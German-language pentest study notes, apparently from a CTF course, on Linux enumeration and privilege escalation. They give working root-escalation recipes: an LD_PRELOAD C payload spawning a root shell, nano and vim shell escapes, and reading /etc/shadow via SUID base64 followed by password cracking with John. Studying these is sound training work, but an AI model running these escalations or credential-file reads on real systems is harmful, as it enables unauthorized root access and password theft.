# Enumeration
Die Enumeration ist der erste Schritt, den man tun muss, wenn man sich Zugang zu einem beliebigen System verschafft hat. Möglicherweise hat man sich Zugang zum System verschafft, indem man eine kritische Schwachstelle ausgenutzt hat, die zu Root-Zugang führte, oder man hat einfach einen Weg gefunden, Befehle über ein Konto mit geringen Privilegien zu senden. Im Gegensatz zu CTF-Maschinen enden Penetrationstests nicht, sobald man Zugriff auf ein bestimmtes System oder eine bestimmte Benutzerebene erhalten hat.

Enumeration ist nach dem Exploiting immernoch genauso wichtig wie vorher!

Befehle zur Enumeration innerhalb eines Systems:


| Befehl/Verzeichniss | Infos die der Ausgibt                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| hostname            | gibt den Hostname des Geräts an.Obwohl dieser Wert leicht geändert werden kann oder eine relativ bedeutungslose Zeichenfolge ist (z. B. Ubuntu-3487340239), kann er in einigen Fällen Informationen über die Rolle des Zielsystems innerhalb des Unternehmensnetzwerks liefern (z. B. SQL-PROD-01 für einen SQL-Produktionsserver)                                                                                                                                                          |
| uname -a            | Gibt Systeminformationen aus, die uns zusätzliche Details über den vom System verwendeten Kernel liefern. Dies ist nützlich bei der Suche nach möglichen Kernel-Schwachstellen, die zu einer Privilegienausweitung führen könnten.                                                                                                                                                                                                                                                          |
| /proc/version       | Das proc-Dateisystem (procfs) liefert Informationen über die Prozesse des Zielsystems.  Man findet proc in vielen verschiedenen Linux-Varianten, was es zu einem unverzichtbaren Werkzeug in Ihrem Arsenal macht.<br><br>Ein Blick auf /proc/version kann Informationen über die Kernelversion und zusätzliche Daten liefern, z. B. ob ein Compiler (z. B. GCC) installiert ist.                                                                                                            |
| /etc/issue          | Systeme können auch durch einen Blick in die Datei /etc/issue identifiziert werden. Diese Datei enthält normalerweise einige Informationen über das Betriebssystem, kann aber leicht angepasst oder geändert werden. Apropos, jede Datei mit Systeminformationen kann angepasst oder geändert werden. Für ein besseres Verständnis des Systems ist es immer gut, sich alle diese Dateien anzusehen.                                                                                         |
| env                 | Zeigt die Variabeln des enviorments                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| sudo -l             | Das Zielsystem kann so konfiguriert sein, dass die Benutzer einige (oder alle) Befehle mit Root-Rechten ausführen können. Der Befehl sudo -l kann verwendet werden, um alle Befehle aufzulisten, die Ihr Benutzer mit sudo ausführen kann.                                                                                                                                                                                                                                                  |
| Id                  | Ermöglicht einen Generellen Überblick über die Privilegien des aktuellen Benutzers                                                                                                                                                                                                                                                                                                                                                                                                          |
| /etc/passwd         | Das Lesen der Datei /etc/passwd kann ein einfacher Weg sein, um Benutzer auf dem System zu entdecken. Die Ausgabe kann zwar lang und etwas einschüchternd sein, aber man kann sie leicht kürzen und in eine nützliche Liste für Brute-Force-Angriffe umwandeln. Bedenken muss man jedoch, dass die Datei /etc/passwd nicht sehr umfangreich ist. <br>Ein anderer Ansatz könnte sein, nach „home“ zu suchen, da echte Benutzer ihre Ordner höchstwahrscheinlich im „home“-Verzeichnis haben. |
| history             | Wenn man sich frühere Befehle mit dem Befehl history ansieht, kann man sich ein Bild über das Zielsystem machen und, wenn auch selten, Informationen wie Kennwörter oder Benutzernamen speichern.                                                                                                                                                                                                                                                                                           |
| ifconfig            | Das Zielsystem kann ein Dreh- und Angelpunkt zu einem anderen Netzwerk sein. Der Befehl ifconfig liefert uns Informationen über die Netzwerkschnittstellen des Systems.                                                                                                                                                                                                                                                                                                                     |

Außerhalb der Tabelle da mehrere Optionen vorhanden

##### ps Command
Der Befehl ps ist eine effektive Methode, um die laufenden Prozesse auf einem Linux-System zu sehen. Wenn man ps in das Terminal eingibt, werden die Prozesse der aktuellen Shell angezeigt.

Die Ausgabe von ps (Prozessstatus) zeigt Folgendes an;
- PID: Die Prozess-ID (eindeutig für den Prozess)
- TTY: Der vom Benutzer verwendete Terminaltyp
- Time: Die vom Prozess verbrauchte CPU-Zeit (dies ist NICHT die Zeit, die der Prozess bereits läuft
- CMD: Der Befehl oder die ausführbare Datei, die gerade ausgeführt wird (es werden KEINE Befehlszeilenparameter angezeigt)

Der Befehl „ps“ bietet ein paar nützliche Optionen.
- ps -A: Alle laufenden Prozesse anzeigen
- ps axjf: Prozessbaum anzeigen (siehe die Baumbildung bis zur Ausführung von ps axjf weiter unten)
- ps aux: Die Option aux zeigt Prozesse für alle Benutzer (a), den Benutzer, der den Prozess gestartet hat (u), und Prozesse, die nicht an ein Terminal angeschlossen sind (x), an. Wenn wir uns die Ausgabe des Befehls ps aux ansehen, können wir ein besseres Verständnis des Systems und möglicher Schwachstellen gewinnen.

##### netstat
Nach einer ersten Überprüfung der vorhandenen Schnittstellen und Netzwerkrouten lohnt es sich, die bestehende Kommunikation zu untersuchen. Der Befehl netstat kann mit verschiedenen Optionen verwendet werden, um Informationen über bestehende Verbindungen zu sammeln.

- netstat -a: zeigt alle lauschenden Ports und bestehenden Verbindungen an.
- netstat -at oder netstat -au können auch verwendet werden, um TCP- bzw. UDP-Protokolle aufzulisten.
- netstat -l: listet Ports im „Abhör“-Modus auf. Diese Ports sind offen und bereit, eingehende Verbindungen zu akzeptieren. Dies kann mit der Option „t“ verwendet werden, um nur Ports aufzulisten, die das TCP-Protokoll abhören (siehe unten)
- netstat -tp: Auflistung von Verbindungen mit dem Namen des Dienstes und PID-Informationen; kann auch mit der Option -l verwendet werden, um lauschende Ports aufzulisten
- netstat -i: Zeigt Schnittstellenstatistiken an. Wir sehen unten, dass „eth0“ und „tun0“ aktiver sind als „tun1“.

Die netstat-Anwendung, die Sie wahrscheinlich am häufigsten in Blog-Beiträgen, Aufsätzen und Kursen sehen werden, ist netstat -ano, die sich wie folgt aufschlüsseln lässt;
-a: Alle Sockets anzeigen
-n: Namen nicht auflösen
-o: Timer anzeigen


##### find
Unterhalb Optionen und Funktionen dieser

Syntax

```
find *Option aus beispiel unterhalb*
```

| Option                                | Was es tut                                                                                                                       |
| ------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| . -name flag1.txt                     | Sucht nach der  "flag1.txt" datei im aktuellen Verzeichniss                                                                      |
| /home -name flag1.txt                 | Sucht nach der "flag1.txt" Datei im /home Verzeichniss                                                                           |
| / -type d -name config                | sucht das Verzeichnis namens config unter „/“                                                                                    |
| / -type f -perm 0777                  | sucht nach Dateien mit der Berechtigung 777 (Dateien, die von allen Benutzern gelesen, geschrieben und ausgeführt werden können) |
| / -perm a=x                           | findet ausführbare Dateien                                                                                                       |
| /home -user frank                     | findet alle Dateien für den Benutzer „frank“ unter „/home“                                                                       |
| / -mtime 10                           | findet Dateien, die in den letzten 10 Tagen geändert wurden                                                                      |
| / -atime 10                           | findet Dateien, auf die in den letzten 10 Tagen zugegriffen wurde                                                                |
| / -cmin -60                           | findet Dateien, die in der letzten Stunde (60 Minuten) geändert wurden                                                           |
| / -amin -60                           | Findet Dateien, auf die innerhalb der letzten Stunde (60 Minuten) zugegriffen wurde                                              |
| / -size 50M                           | findet Dateien mit einer Größe von 50 MB                                                                                         |
| / -writable -type d 2>/dev/null       | Suche nach global beschreibbaren Ordnern                                                                                         |
| / -perm -222 -type d 2>/dev/null      | Suche nach global beschreibbaren Ordnern                                                                                         |
| / -perm -o w -type d 2>/dev/null      | Suche nach global beschreibbaren Ordnern                                                                                         |
| find / -perm -o x -type d 2>/dev/null | Suche nach global aussführbaren Ordnern                                                                                          |



# Automatische Enumeration Tools

Verschiedene Tools können dabei helfen, während des Enumeration-Prozesses Zeit zu sparen. Diese Tools sollten nur verwendet werden, um Zeit zu sparen, da sie einige Vektoren zur Privilegienerweiterung übersehen können. Im Folgenden findet sich eine Liste beliebter Linux-Enumeration-Tools mit Links zu den jeweiligen Github-Repositories.

Die Umgebung des Zielsystems hat Einfluss auf das Tool, das man verwenden kann. So kann zum Beispiel ein in Python geschriebenes Tool nicht ausgeführt werden, wenn es nicht auf dem Zielsystem installiert ist. Aus diesem Grund ist es besser, mit einigen wenigen Tools vertraut zu sein, als ein einziges zu haben.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# Privilegien Eskalierung: Kernel Exploits

Die Eskalation von Privilegien führt im Idealfall zu Root-Rechten. Dies kann manchmal einfach durch das Ausnutzen einer bestehenden Schwachstelle erreicht werden, oder in einigen Fällen durch den Zugriff auf ein anderes Benutzerkonto, das über mehr Privilegien, Informationen oder Zugriff verfügt.

Sofern nicht eine einzige Sicherheitslücke zu einer Root-Shell führt, beruht der Prozess der Privilegienerweiterung auf Fehlkonfigurationen und lockeren Berechtigungen.
Der Kernel auf Linux-Systemen verwaltet die Kommunikation zwischen Komponenten wie dem Speicher des Systems und Anwendungen. Für diese kritische Funktion benötigt der Kernel bestimmte Privilegien; ein erfolgreicher Exploit führt daher potenziell zu Root-Rechten.

Die Methodik zur Ausnutzung des Kernels ist einfach;
- Identifizieren der Kernel-Version
- Suchen und finden von Exploit-Code für die Kernel-Version des Zielsystems
- Ausführen des Exploits

Auch wenn es einfach aussieht, denken Sie bitte daran, dass ein fehlgeschlagener Kernel-Exploit zu einem Systemabsturz führen kann. Vergewissern Sie sich, dass dieses potenzielle Ergebnis im Rahmen Ihres Penetrationstestauftrags akzeptabel ist, bevor Sie einen Kernel-Exploit versuchen.

Mögliche Ressourcen:
1. Based on your findings, you can use Google to search for an existing exploit code.
2. Sources such as https://www.cvedetails.com/ can also be useful.
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).


# Privilegien Eskalieren: Sudo

Manchmal ist es von Nöten Nutzern das Recht auf Sudo in gewissen kontexten (z.B. SOC analyst der zugriff auf NMAP braucht) zu geben. Hier werden dann aber nicht volle Sudo Rechte vergeben sondern nur Freischaltungen für Spezielle Programme. Worauf zugriff für den Nutzer besteht kann man mit `sudo -l` nachschauen. Zudem ist [https://gtfobins.github.io/](https://gtfobins.github.io/) hier eine gute Ressource da man dort nachlesen kann welche Programme vielleicht sudo rechte haben und wie man die nutzt. 

##### Ausnutzen von Applikations Funktionen 

Im Kontext der Privilegien Eskallation haben Manche Programme Bekannte schwachstellen wie z.B. Apache2 server. In diesem Fall können wir einen „Hack“ verwenden, um Informationen durch Ausnutzung einer Funktion der Anwendung auszuspähen. Wie man weiter unten sehen kann, hat Apache2 eine Option, die das Laden alternativer Konfigurationsdateien unterstützt (-f : Angabe einer alternativen ServerConfigFile).

https://imgur.com/aPjED9U

Wenn man diese Option verwendet, um die Datei /etc/shadow zu laden, erhält man eine Fehlermeldung, die die erste Zeile der Datei /etc/shadow enthält.

Anderes Besipiel, Sudo Rechte auf "Nano"

hier Starten wir nano via `sudo nano` danach sorgen wir für Befehl Eingabe via `CTRL R`  `CTRL X` und weiten dann die Rechte via `reset; sh 1>&0 2>&0` aus und schon haben wir Root rechte


##### Ausnutzen von LD_PRELOAD

LD_PRELOAD ist eine Funktion die man auf manchen Systemen wiederfindet, sie wird dafür verwendet es jedem Programm zu ermöglichen gemeinsame Bibilotheken zu verwenden. Dieser Blog-Beitrag gibt einen Eindruck von den Möglichkeiten von LD_PRELOAD (https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/).
Wenn die Option „env_keep“ aktiviert ist, können wir eine gemeinsam genutzte Bibliothek erzeugen, die geladen und ausgeführt wird, bevor das Programm ausgeführt wird. Bitte beachten Sie, dass die LD_PRELOAD-Option ignoriert wird, wenn die reale Benutzer-ID nicht mit der effektiven Benutzer-ID übereinstimmt.

Hier Die schritte um die Lücke auszunutzen: 
- Prüfen ob LD_PRELOAD vorhanden ist (mit der Option env_keep)
- Schreiben eines einfachen C-Codes, der als Share Object-Datei (.so-Erweiterung) kompiliert wurde
- Ausführen des Programms mit sudo-Rechten und der Option LD_PRELOAD, die auf unsere .so-Datei zeigt

Beispielhafter C Code: 

```
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

Man kann diesen Code als shell.c speichern und mit gcc unter Verwendung der folgenden Parameter in eine gemeinsam genutzte Objektdatei kompilieren;

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Man kann die gemeinsame Objektdatei nun verwenden, wenn man ein beliebiges Programm startet, das der Benutzer mit sudo ausführen kann. In unserem Fall können Apache2, find oder fast jedes andere Programm, das wir mit sudo ausführen können, verwendet werden.

Man muss das Programm starten, indem man die Option LD_PRELOAD wie folgt angibt;

```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

Dies führt dazu, dass eine Shell mit Root-Rechten gestartet wird.

# Privilegien Eskalieren: SUID

Ein Großteil der Linux-Privilegien Kontrolle beruht auf der Kontrolle der Interaktionen zwischen Benutzern und Dateien. Dies geschieht mit Hilfe von Berechtigungen. Inzwischen weißt du, dass Dateien Lese-, Schreib- und Ausführungsberechtigungen haben können. Diese werden den Benutzern innerhalb ihrer Berechtigungsstufen erteilt. Dies ändert sich mit SUID (Set-user Identification) und SGID (Set-group Identification). Damit können Dateien mit der Berechtigungsstufe des Dateibesitzers bzw. des Gruppenbesitzers ausgeführt werden.

Diese Dateien haben dann ein "s" Bit was das Spezielle Freigaben Level widerspiegelt. `find / -type f -perm -04000 -ls 2>/dev/null` listet Dateien auf, die SUID- oder SGID-Bits gesetzt haben.

Es empfiehlt sich, die ausführbaren Dateien in dieser Liste mit GTFO Bins (https://gtfobins.github.io) zu vergleichen. Wenn man die Schaltfläche SUID anklickt, werden Binärdateien herausgefiltert, von denen bekannt ist, dass sie ausnutzbar sind, wenn das SUID-Bit gesetzt ist (Link für eine vor gefilterte Liste verwenden https://gtfobins.github.io/#+suid).

Beispiel, es wurde gefunden dass der Nutzer SUID rechte auf BASE64 besitzt. Nach nachschauen auf der Website kann dies wie Folgt ausgenutzt werden 


```
LFILE=*Datei die Gelesen werden soll* bsp /etc/passwd
base64 "$LFILE" | base64 --decode
```

Das kann man dann nutzen um z.B. die Passwd und Shadow datei auszulesen und zuu kopieren. Diese Kopien kann man dann zusammenfügen via `unshadow passwd.txt shadow.txt > passwords.txt` und dann in John the Ripper weiterverarbeiten und Knacken via `john /usr/share/wordlists/rockyou.txt password.txt `

# Privilegien Eskalieren: Capabilities


Eine weitere Methode, mit der Systemadministratoren die Berechtigungsstufe eines Prozesses oder einer Binärdatei erhöhen können, sind „Fähigkeiten“. Fähigkeiten helfen bei der Verwaltung von Berechtigungen auf einer detaillierteren Ebene. Wenn der SOC-Analyst beispielsweise ein Tool verwenden muss, das Socket-Verbindungen initiieren muss, wäre ein normaler Benutzer dazu nicht in der Lage. Wenn der Systemadministrator diesem Benutzer keine höheren Privilegien einräumen möchte, kann er die Fähigkeiten des Binarys ändern. Dadurch würde das Binary seine Aufgabe erfüllen, ohne dass ein Benutzer mit höheren Rechten benötigt wird.

Die "ManPage" der Capabilities gibt hier auch noch genauen Aufschluss auf die Anwendungsfälle und Optionen

Wir können das Werkzeug getcap verwenden, um die aktivierten Fähigkeiten aufzulisten. Das geht via `getcap -r` da es aber dabei zu vielen Fehlermeldungen kommt empfiehlt sich `getcap -r / 2>/dev/null`.

Beispiel wir haben Festgestellt das VIM sich ausnutzen lässt dies funktioniert dann via 

```
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

Wie auch zuvor kommt der Befehl/die lücke via https://gtfobins.github.io/#+capabilities


# Privilegien Eskalieren: Cron Jobs

